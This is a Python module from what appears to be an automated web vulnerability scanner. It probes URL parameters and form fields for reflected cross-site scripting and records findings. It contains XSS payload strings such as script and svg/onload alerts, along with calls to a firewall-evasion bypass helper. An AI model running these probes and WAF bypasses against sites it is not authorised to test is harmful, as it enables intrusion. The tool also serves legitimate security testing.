"""Reflected & Form XSS scanner with mutex-coordinated polymorphic WAF bypass (`probe_with_mutex_bypass`)."""
import urllib.parse
from core.http import get, post
from core.waf_bypass import probe_with_mutex_bypass
from scan.payloads import XSS
from core.findings import Finding
from core.memory import log_event

REFLECTION_MARKERS = [
    "<script>alert(1)</script>",
    "onerror=alert(1)",
    "onload=alert(1)",
    "<svg/onload=confirm`1`>",
    "<details/open/ontoggle=alert`1`>",
]


def scan_url(url, params=None):
    findings = []
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    test_params = list(qs.keys()) if qs else (params or [])
    if not test_params:
        return findings

    base_r = get(url)
    for param in test_params:
        for payload in XSS:
            r, used_p, bypass_tag = probe_with_mutex_bypass(
                url, param, payload, vuln_class="xss", baseline_status=base_r.status or 200
            )
            if r.status == 0:
                continue
            ct = (r.headers.get("content-type") or "").lower()
            if "application/json" in ct:
                continue
            body = r.text or ""
            reflected = (used_p in body) or any(m in body.lower() for m in REFLECTION_MARKERS)
            if reflected and ("<" in used_p or "onerror" in used_p.lower() or "onload" in used_p.lower() or "ontoggle" in used_p.lower()):
                findings.append(Finding(
                    id=f"xss-{hash(url + param + used_p) & 0xffff:x}",
                    target=parsed.netloc,
                    type="Reflected XSS",
                    severity="high",
                    url=url,
                    parameter=param,
                    payload=used_p,
                    evidence=f"Payload reflected unencoded in HTML response (status {r.status})" + (f" via {bypass_tag}" if bypass_tag else ""),
                    request=r.raw_request,
                    response_snippet=r.snippet(300),
                    confidence=0.82,
                    detected_by="hunter:xss",
                    waf_bypass_used=bypass_tag,
                ))
                break
    log_event(parsed.netloc, "xss_scan", {"url": url, "findings": len(findings)})
    return findings


def scan_form(form: dict) -> list[Finding]:
    findings = []
    action = form.get("action", "")
    method = (form.get("method") or "GET").upper()
    parsed = urllib.parse.urlparse(action)
    for inp in form.get("inputs", []):
        for payload in XSS[:4]:
            data = {i["name"]: (payload if i["name"] == inp["name"] else (i.get("value") or "test")) for i in form.get("inputs", [])}
            r = post(action, data=data) if method == "POST" else get(action, params=data)
            if r.status == 0:
                continue
            if payload in (r.text or "") and "application/json" not in (r.headers.get("content-type") or "").lower():
                findings.append(Finding(
                    id=f"xssform-{hash(action + inp['name'] + payload) & 0xffff:x}",
                    target=parsed.netloc,
                    type="Reflected XSS (form)",
                    severity="medium",
                    url=action,
                    parameter=inp["name"],
                    payload=payload,
                    evidence=f"Form {method} input reflected unencoded",
                    request=r.raw_request,
                    response_snippet=r.snippet(300),
                    confidence=0.75,
                    detected_by="hunter:xss_form",
                ))
                break
    return findings


def scan_forms(forms, base_url):
    out = []
    for f in forms:
        out.extend(scan_form(f))
    return out
